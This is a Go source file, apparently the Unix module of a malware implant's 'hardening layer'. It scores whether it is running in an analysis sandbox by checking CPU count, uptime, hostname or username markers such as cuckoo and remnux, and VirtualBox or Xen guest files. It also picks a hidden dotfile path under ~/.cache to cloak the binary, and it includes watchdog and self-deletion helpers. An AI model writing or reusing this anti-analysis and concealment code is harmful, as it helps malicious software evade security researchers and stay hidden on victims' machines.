//go:build !windows

package main

import (
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Unix side of the hardening layer. There is no AMSI/ETW to patch, so the work
// is analysis-host detection plus the watchdog helpers.

func hardenProcess() {}

func sandboxScore() int {
	score := 0
	if runtime.NumCPU() < 2 {
		score++
	}
	// fresh boot = likely a fresh analysis VM
	if b, err := os.ReadFile("/proc/uptime"); err == nil {
		if f := strings.Fields(string(b)); len(f) > 0 {
			if up, err := strconv.ParseFloat(f[0], 64); err == nil && up < 600 {
				score++
			}
		}
	}
	host, _ := os.Hostname()
	user := os.Getenv("USER")
	ident := strings.ToLower(host + "|" + user)
	for _, marker := range []string{"sandbox", "virus", "malware", "cuckoo",
		"maltest", "analyst", "virtualbox", "vagrant", "remnux"} {
		if strings.Contains(ident, marker) {
			score++
			break
		}
	}
	for _, f := range []string{"/proc/vboxguest", "/sys/class/misc/vboxguest",
		"/proc/xen", "/sys/hypervisor/type"} {
		if _, err := os.Stat(f); err == nil {
			score++
			break
		}
	}
	return score
}

func cloakPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return filepath.Join(os.TempDir(), ".phantom")
	}
	exe, _ := os.Executable()
	return filepath.Join(home, ".cache", "."+filepath.Base(exe))
}

func alive(pid int) bool {
	p, err := os.FindProcess(pid)
	if err != nil {
		return false
	}
	return p.Signal(syscall.Signal(0)) == nil
}

// scheduleSelfDelete has no unix equivalent that survives reboot without a
// service, so the caller keeps the file and hides it instead.
func scheduleSelfDelete(path string) bool { return false }

func hideFile(path string) {}

// keep time imported for the shared call sites
var _ = time.Second
